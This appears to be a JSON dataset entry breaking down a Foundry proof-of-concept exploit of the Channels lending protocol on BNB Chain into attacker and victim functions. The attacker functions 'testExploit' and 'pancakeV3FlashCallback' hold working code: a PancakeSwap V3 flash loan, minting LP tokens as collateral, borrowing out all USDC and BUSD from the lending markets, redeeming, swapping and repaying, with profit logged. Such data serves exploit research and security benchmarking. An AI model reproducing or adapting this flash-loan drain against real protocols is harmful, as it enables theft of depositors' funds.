[
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        IERC20(busd).transfer(busd_btcb, IERC20(busd).balanceOf(address(this)));\n        IERC20(btcb).transfer(busd_btcb, IERC20(btcb).balanceOf(address(this)));\n        uint256 liquidity = IMint(busd_btcb).mint(address(this));\n        IERC20(busd_btcb).transfer(channels1, IERC20(busd_btcb).balanceOf(address(this)));\n        IERC20(cake).transfer(channels1, IERC20(cake).balanceOf(address(this)));\n\n        IChannel(channels1).accrueInterest();\n        address[] memory tokens = new address[](1);\n        tokens[0] = channels1;\n        IComptroller(anon).enterMarkets(tokens);\n\n        address[] memory tokens2 = new address[](2);\n        tokens2[0] = cusdc;\n        tokens2[1] = cbusd;\n        IComptroller(anon).enterMarkets(tokens2);\n\n        IChannel(cusdc).borrow(IERC20(cudsc_underlying).balanceOf(cusdc));\n        IChannel(cbusd).borrow(IERC20(busd_underlying).balanceOf(cbusd));\n        IChannel(channels1).redeemUnderlying(174_494_827_409_609_936_689); // busd_btcb balance - 1\n\n        IERC20(pancake_swap).transfer(pancake_swap, IERC20(pancake_swap).balanceOf(address(this)));\n        (uint256 amount0, uint256 amount1) = IUniswapV2Pair(pancake_swap).burn(address(this));\n\n        address token1 = btcb;\n        uint24 fee1 = 500;\n\n        address token2 = wbnb;\n        uint24 fee2 = 500;\n\n        address token3 = cudsc_underlying;\n        bytes memory path = abi.encodePacked(token1, fee1, token2, fee2, token3);\n\n        Pancke_ExactOutputParams memory params = Pancke_ExactOutputParams({\n            path: path,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountOut: 503_715_695_155_049,\n            amountInMaximum: type(uint256).max\n        });\n\n        IERC20(cudsc_underlying).approve(pancake_router, type(uint256).max);\n        uint256 amountin = PancakeRouter(pancake_router).exactOutput(params);\n        // payback\n        IERC20(btcb).transfer(pancakeV3Pool, 1_000_500_000_000_000_000);\n        IERC20(busd).transfer(pancakeV3Pool, 42_239_782_154_632_122_088_406);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 34_847_596 - 1);\n        deal(cake, address(this), 1e18);\n        deal(ac, address(this), 2);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Channels",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        uint256 init = IERC20(busd).balanceOf(address(this));\n        uint256 init_usdc = IERC20(cudsc_underlying).balanceOf(address(this));\n\n        IPancakePool(pancakeV3Pool).flash(\n            address(this),\n            1_000_000_000_000_000_000,\n            42_218_672_818_223_010_583_114,\n            \"0x0000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000000000000000000000000008f0adc86c0efe5c924a\"\n        );\n        uint256 after_attack = IERC20(busd).balanceOf(address(this));\n        uint256 after_attack_usdc = IERC20(cudsc_underlying).balanceOf(address(this));\n        emit log_named_decimal_uint(\"Attacker BUSD end exploited\", after_attack - init, 18);\n        emit log_named_decimal_uint(\"Attacker USDC end exploited\", after_attack_usdc - init_usdc, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IComptroller",
    "source_type": "victim_contract",
    "function_name": "claimComp",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IComptroller",
    "source_type": "victim_contract",
    "function_name": "enterMarkets",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IChannel",
    "source_type": "victim_contract",
    "function_name": "accrueInterest",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IChannel",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IChannel",
    "source_type": "victim_contract",
    "function_name": "redeemUnderlying",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMint",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Collects tokens owed to a position\n    /// @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.\n    /// Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or\n    /// amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the\n    /// actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\n    /// @param recipient The address which should receive the fees collected\n    /// @param tickLower The lower tick of the position for which to collect fees\n    /// @param tickUpper The upper tick of the position for which to collect fees\n    /// @param amount0Requested How much token0 should be withdrawn from the fees owed\n    /// @param amount1Requested How much token1 should be withdrawn from the fees owed\n    /// @return amount0 The amount of fees collected in token0\n    /// @return amount1 The amount of fees collected in token1\n",
    "description": ""
  },
  {
    "contract/interface": "PancakeRouter",
    "source_type": "victim_contract",
    "function_name": "exactOutput",
    "original_code": "    function exactOutput(ExactOutputParams calldata params)\n        external\n        payable\n        override\n        checkDeadline(params.deadline)\n        returns (uint256 amountIn)\n    {\n        // it's okay that the payer is fixed to msg.sender here, as they're only paying for the \"final\" exact output\n        // swap, which happens first, and subsequent swaps are paid for within nested callback frames\n        exactOutputInternal(\n            params.amountOut,\n            params.recipient,\n            0,\n            SwapCallbackData({path: params.path, payer: msg.sender})\n        );\n\n        amountIn = amountInCached;\n        require(amountIn <= params.amountInMaximum, 'Too much requested');\n        amountInCached = DEFAULT_AMOUNT_IN_CACHED;\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePool",
    "source_type": "victim_contract",
    "function_name": "flash",
    "original_code": "    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n\n    /// @notice Increase the maximum number of price and liquidity observations that this pool will store\n    /// @dev This method is no-op if the pool already has an observationCardinalityNext greater than or equal to\n    /// the input observationCardinalityNext.\n    /// @param observationCardinalityNext The desired minimum number of observations for the pool to store\n",
    "description": ""
  }
]